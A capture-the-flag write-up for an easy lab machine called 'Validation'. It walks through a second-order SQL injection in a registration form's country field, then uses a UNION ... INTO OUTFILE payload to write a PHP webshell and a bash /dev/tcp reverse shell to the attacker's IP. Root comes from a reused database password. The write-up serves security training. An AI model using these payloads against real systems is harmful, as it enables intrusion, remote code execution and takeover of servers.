@@ -1,0 +1,90 @@
+ Validation
+
+      9th September 2021
+      Prepared By: ippsec
+      Machines Creator(s): ippsec
+Difficulty: Easy
+Classification: Official
+
+Synopsis:
+
+Validation is an easy machine created for the September Qualifiers of UHC (Ultimate Hacking
+Championship). There is a web page that lets users register and specify their country. Once
+signed in, the website displays other users within your Country and the query it does this is
+Vulnerable to SQL Injection. The registration function utilizes Prepared Statements and is not SQL
+Injectable, however the developer trusted that all data from the database was safe and did not
+use Prepared Statements when viewing others users in the country making this a Second Order
+SQL Injection. It is possible to write a webshell and then escalate to root via a re-used database
+password.
+
+Skills Required
+
+      Web Enumeration
+      SQL Injection
+
+Enumeration
+
+Nmap
+
+   nmap -p- 10.10.11.116
+Nmap reveals that 22 (SSH), 80 (HTTP), and 8080 (HTTP) are open. Only Port 80 gives us a page,
+so we will start there.
+
+Homepage (Port 80)
+
+Navigating to port 80 reveals a single page that asks for a username and a dropdown box to
+select the country. If this request is intercepted we can see that the dropdown is just plaintext
+and we can modify it to be values other than a country. Additionally, the page will send us a
+cookie back called "user" and direct us to /account.php. If we send this request multiple times, we
+will notice the cookie it is giving us does not change until we change the "Username" variable
+indicating that the session is not random.
+
+Second Order SQL Injection
+
+Upon registering an account we are brought to a page that shows other players in our country. If
+we edit the registration request and place a Single Quote in the country the account page will
+display an error message:
+
+   : Uncaught Error: Call to a member function fetch_assoc() on bool in
+   /var/www/html/account.php:33
+If we change the payload from Country' to Country' -- - , the error message goes away
+confirming this is a SQL Injection.
+
+The easiest way to exploit this is to open two Repear Tabs, one for registering accounts and the
+other for viewing the account.php page. The workflow is:
+
+      Go to the registration tab
+      Change the username (to get a different cookie)
+      Place an SQL Injection in the Country and register
+      Copy the cookie and paste it into the second tab (Account.php)
+
+By sending the country of Country' Union Select 1-- - , we see the page no longer displays an
+error which tells us the SQL Query is returning 1 variable.
+
+Dropping a File
+
+Knowing that there is Union Injection and that this is an PHP Applicaiton, we can attempt to use
+the "INTO OUTFILE" statement of SQL to drop a webshell. Sending the payload
+
+   country' union select "<?php SYSTEM($_REQUEST['cmd']); ?>" INTO OUTFILE
+   '/var/www/html/shell.php'-- -
+
+It will create a PHP WebShell on the server which was can use to get code execution. The weird
+thing about this is the /account.php , will display an SQL Error which may lead you to believe it
+did not work. This is because the SQL Syntax we used does not return any fields when creating
+the file, it is expecting it to return the country name but since it doesn't it errors. If you navigate
+to 10.10.11.116/shell.php you can confirm the file now exists.
+
+Getting a Reverse Shell is as simple as just sending the normal bash URL Encoded payload:
+
+   Regular: bash -c 'bash -i >& /dev/tcp/<your ip address>/<port> 2>&1
+   URL Encoded: bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.8/9001+0>%261'
+Root
+
+With a shell on the box we can cat the config.php to reveal the Database Credentials and notice
+that the password has global-pw in it. This is a big hint that this password is used elsewhere.
+Attempting to su - with it provide a root shell.
+
+Note: You may not always get a visible prompt back after you enter the password. If you enter a
+command you will see it did provide you a shell.
+
